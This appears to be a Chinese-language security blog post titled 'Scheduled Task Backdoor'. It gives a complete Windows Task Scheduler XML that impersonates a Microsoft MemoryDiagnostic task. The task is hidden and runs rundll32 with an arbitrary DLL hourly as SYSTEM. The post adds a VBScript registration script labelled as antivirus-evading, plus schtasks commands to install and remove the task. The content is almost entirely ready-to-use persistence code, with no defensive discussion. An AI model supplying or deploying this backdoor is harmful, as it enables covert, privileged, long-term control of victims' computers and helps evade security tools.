<!doctype html><html lang=zh-cn manifest=https://blog.xhstormr.tk/offline.appcache><head><meta charset=utf-8><meta name=renderer content="webkit"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>计划任务 Backdoor &#183; XhstormR</title><link rel=alternate type=application/rss+xml title=XhstormR href><link rel=icon type=image/x-icon href=https://blog.xhstormr.tk/favicon.ico><link rel=stylesheet href=https://blog.xhstormr.tk/css/uno.min.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.2/styles/monokai-sublime.min.css><script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js></script><script src=https://blog.xhstormr.tk/js/main.min.js async defer></script></head><body><div id=scriptHeader><span class="mobile btn-mobile-menu"><i class="fa fa-bars btn-mobile-menu__icon"></i>
<i class="fa fa-times btn-mobile-close__icon hidden"></i></span><header class="panel-cover panel-cover--collapsed"><div class=panel-main><div class="panel-main__inner panel-inverted"><div class=panel-main__content><h1 class="panel-cover__title panel-title"><a href=https://blog.xhstormr.tk/ title="link to homepage for XhstormR">XhstormR</a></h1><hr class=panel-cover__divider><p class=panel-cover__description>On a dark desert highway, cool wind in my hair.</p><hr class="panel-cover__divider panel-cover__divider--secondary"><div class=navigation-wrapper><nav class="cover-navigation cover-navigation--primary"><ul class=navigation><li class=navigation__item><a href=https://blog.xhstormr.tk#blog title="link to XhstormR blog" class=blog-button>Blog</a></li></ul></nav></div></div></div><div class=panel-cover--overlay></div></div></header></div><div class=bodytop><div class=content-wrapper><div class=content-wrapper__inner><div class=post><h1>计划任务 Backdoor</h1><span class=post-date>2019-10-04</span><p>Updated on 2019-10-04</p><h2 id=123xml>123.xml</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
<span style=color:#f92672>&lt;Task</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;</span><span style=color:#f92672>&gt;</span>
  <span style=color:#f92672>&lt;RegistrationInfo&gt;</span>
    <span style=color:#f92672>&lt;Source&gt;</span>Microsoft Corporation<span style=color:#f92672>&lt;/Source&gt;</span>
    <span style=color:#f92672>&lt;Author&gt;</span>Microsoft Corporation<span style=color:#f92672>&lt;/Author&gt;</span>
    <span style=color:#f92672>&lt;URI&gt;</span>\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents<span style=color:#f92672>&lt;/URI&gt;</span>
  <span style=color:#f92672>&lt;/RegistrationInfo&gt;</span>
  <span style=color:#f92672>&lt;Triggers&gt;</span>
    <span style=color:#f92672>&lt;TimeTrigger&gt;</span>
      <span style=color:#f92672>&lt;Repetition&gt;</span>
        <span style=color:#f92672>&lt;Interval&gt;</span>PT1H<span style=color:#f92672>&lt;/Interval&gt;</span>
        <span style=color:#f92672>&lt;StopAtDurationEnd&gt;</span>false<span style=color:#f92672>&lt;/StopAtDurationEnd&gt;</span>
      <span style=color:#f92672>&lt;/Repetition&gt;</span>
      <span style=color:#f92672>&lt;StartBoundary&gt;</span>2000-01-01T00:00:00<span style=color:#f92672>&lt;/StartBoundary&gt;</span>
      <span style=color:#f92672>&lt;Enabled&gt;</span>true<span style=color:#f92672>&lt;/Enabled&gt;</span>
    <span style=color:#f92672>&lt;/TimeTrigger&gt;</span>
  <span style=color:#f92672>&lt;/Triggers&gt;</span>
  <span style=color:#f92672>&lt;Principals&gt;</span>
    <span style=color:#f92672>&lt;Principal</span> <span style=color:#a6e22e>id=</span><span style=color:#e6db74>&#34;LocalSystem&#34;</span><span style=color:#f92672>&gt;</span>
      <span style=color:#f92672>&lt;UserId&gt;</span>S-1-5-18<span style=color:#f92672>&lt;/UserId&gt;</span>
      <span style=color:#f92672>&lt;RunLevel&gt;</span>HighestAvailable<span style=color:#f92672>&lt;/RunLevel&gt;</span>
    <span style=color:#f92672>&lt;/Principal&gt;</span>
  <span style=color:#f92672>&lt;/Principals&gt;</span>
  <span style=color:#f92672>&lt;Settings&gt;</span>
    <span style=color:#f92672>&lt;MultipleInstancesPolicy&gt;</span>StopExisting<span style=color:#f92672>&lt;/MultipleInstancesPolicy&gt;</span>
    <span style=color:#f92672>&lt;DisallowStartIfOnBatteries&gt;</span>false<span style=color:#f92672>&lt;/DisallowStartIfOnBatteries&gt;</span>
    <span style=color:#f92672>&lt;StopIfGoingOnBatteries&gt;</span>true<span style=color:#f92672>&lt;/StopIfGoingOnBatteries&gt;</span>
    <span style=color:#f92672>&lt;AllowHardTerminate&gt;</span>true<span style=color:#f92672>&lt;/AllowHardTerminate&gt;</span>
    <span style=color:#f92672>&lt;StartWhenAvailable&gt;</span>true<span style=color:#f92672>&lt;/StartWhenAvailable&gt;</span>
    <span style=color:#f92672>&lt;RunOnlyIfNetworkAvailable&gt;</span>false<span style=color:#f92672>&lt;/RunOnlyIfNetworkAvailable&gt;</span>
    <span style=color:#f92672>&lt;IdleSettings&gt;</span>
      <span style=color:#f92672>&lt;StopOnIdleEnd&gt;</span>true<span style=color:#f92672>&lt;/StopOnIdleEnd&gt;</span>
      <span style=color:#f92672>&lt;RestartOnIdle&gt;</span>false<span style=color:#f92672>&lt;/RestartOnIdle&gt;</span>
    <span style=color:#f92672>&lt;/IdleSettings&gt;</span>
    <span style=color:#f92672>&lt;AllowStartOnDemand&gt;</span>true<span style=color:#f92672>&lt;/AllowStartOnDemand&gt;</span>
    <span style=color:#f92672>&lt;Enabled&gt;</span>true<span style=color:#f92672>&lt;/Enabled&gt;</span>
    <span style=color:#f92672>&lt;Hidden&gt;</span>true<span style=color:#f92672>&lt;/Hidden&gt;</span>
    <span style=color:#f92672>&lt;RunOnlyIfIdle&gt;</span>false<span style=color:#f92672>&lt;/RunOnlyIfIdle&gt;</span>
    <span style=color:#f92672>&lt;WakeToRun&gt;</span>false<span style=color:#f92672>&lt;/WakeToRun&gt;</span>
    <span style=color:#f92672>&lt;ExecutionTimeLimit&gt;</span>PT0S<span style=color:#f92672>&lt;/ExecutionTimeLimit&gt;</span>
    <span style=color:#f92672>&lt;Priority&gt;</span>0<span style=color:#f92672>&lt;/Priority&gt;</span>
  <span style=color:#f92672>&lt;/Settings&gt;</span>
  <span style=color:#f92672>&lt;Actions</span> <span style=color:#a6e22e>Context=</span><span style=color:#e6db74>&#34;LocalSystem&#34;</span><span style=color:#f92672>&gt;</span>
    <span style=color:#f92672>&lt;Exec&gt;</span>
      <span style=color:#f92672>&lt;Command&gt;</span>%windir%\system32\rundll32.exe<span style=color:#f92672>&lt;/Command&gt;</span>
      <span style=color:#f92672>&lt;Arguments&gt;</span>main.dll msg<span style=color:#f92672>&lt;/Arguments&gt;</span>
    <span style=color:#f92672>&lt;/Exec&gt;</span>
  <span style=color:#f92672>&lt;/Actions&gt;</span>
<span style=color:#f92672>&lt;/Task&gt;</span>
</code></pre></div><h3 id=reference>Reference</h3><ul><li><a href=https://docs.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-schema>https://docs.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-schema</a></li><li><a href=https://docs.microsoft.com/zh-cn/windows/security/identity-protection/access-control/security-identifiers>https://docs.microsoft.com/zh-cn/windows/security/identity-protection/access-control/security-identifiers</a></li></ul><h2 id=注册任务>注册任务</h2><h3 id=脚本免杀>脚本（免杀）</h3><h4 id=123vbs>123.vbs</h4><pre><code>Set service = CreateObject(&quot;Schedule.Service&quot;)
service.Connect

Set file = CreateObject(&quot;Scripting.FileSystemObject&quot;).OpenTextFile(&quot;123.xml&quot;)
text = file.ReadAll
file.Close

Set rootFolder = service.GetFolder(&quot;\&quot;)
rootFolder.RegisterTask &quot;\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents&quot;, text, 6, , , 5
</code></pre><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cscript.exe //Nologo 123.vbs

wscript.exe：输出至 Windows，
cscript.exe：输出至 Console。
</code></pre></div><h4 id=reference-1>Reference</h4><ul><li><a href=https://ss64.com/vb/filesystemobject.html>https://ss64.com/vb/filesystemobject.html</a></li><li><a href=https://docs.microsoft.com/zh-cn/dotnet/api/microsoft.visualbasic.constants>https://docs.microsoft.com/zh-cn/dotnet/api/microsoft.visualbasic.constants</a></li><li><a href=https://docs.microsoft.com/zh-cn/office/vba/language/reference/user-interface-help/filesystemobject-object>https://docs.microsoft.com/zh-cn/office/vba/language/reference/user-interface-help/filesystemobject-object</a></li><li><a href=https://github.com/DoctorLai/VBScript_Obfuscator>https://github.com/DoctorLai/VBScript_Obfuscator</a></li></ul><h3 id=工具>工具</h3><pre><code>schtasks.exe /create /tn &quot;\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents&quot; /f /xml 123.xml
schtasks.exe /query  /tn &quot;\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents&quot; /v /fo list
schtasks.exe /delete /tn &quot;\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents&quot; /f
</code></pre></div><div class=sharing style=text-align:center><br><p>捐赠支持</p><p>如果我的文章对你有所帮助，欢迎通过支付宝的扫一扫，轻松的向我发起捐助。</p><p>对于你的支持，我会心怀感激且倍感荣幸地接受，并继续努力。</p><img src=https://ww4.sinaimg.cn/large/a15b4afegw1fbn096ql6dj20dw0dwwe9.jpg alt title data-action=zoom width=40%><p></p><br>&copy; 2015-2020 XhstormR</div></div></div></div><div id=backtop><a href=# title>TOP</a></div><nav id=TableOfContents><ul><li><a href=#123xml>123.xml</a><ul><li><a href=#reference>Reference</a></li></ul></li><li><a href=#注册任务>注册任务</a><ul><li><a href=#脚本免杀>脚本（免杀）</a></li><li><a href=#工具>工具</a></li></ul></li></ul></nav><script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.2/highlight.min.js></script><script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.2/languages/yaml.min.js></script><script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.2/languages/kotlin.min.js></script><script>hljs.initHighlightingOnLoad()</script><script src=https://blog.xhstormr.tk/js/zoom.min.js></script><script>window.addEventListener("load",show),window.onscroll=show;function show(){document.documentElement.scrollTop+document.body.scrollTop>300?document.getElementById("backtop").style.display="block":document.getElementById("backtop").style.display="none"}</script><script type=text/javascript color=0,0,0 opacity=1 zindex=-2 count=49 src=https://cdnjs.cloudflare.com/ajax/libs/canvas-nest.js/2.0.4/canvas-nest.js></script></body></html>